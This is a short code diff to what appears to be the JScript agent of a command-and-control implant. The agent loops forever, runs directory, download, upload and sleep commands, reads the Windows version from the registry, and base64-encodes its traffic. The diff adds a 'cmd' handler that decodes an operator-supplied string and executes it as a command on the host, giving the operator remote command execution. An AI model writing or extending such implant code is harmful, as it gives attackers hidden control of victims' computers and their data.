@@ -26,6 +26,7 @@ function post(data){
 {% include "/jscript/functions/dir.js" %}
 {% include  "/jscript/functions/download.js" %}
 {% include "/jscript/functions/upload.js" %}
+{% include "/jscript/functions/cmd.js" %}
 
 while (true) {
   try {
@@ -67,6 +68,9 @@ while (true) {
               }
               if ('os' === name) {
                   results = b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber"));
+              }
+              if ('cmd' === name) {
+                  results = cmd(b64d(args[0]));
               }
               if ('sleep' === name) {
                   sleep = b64d(args[0]);
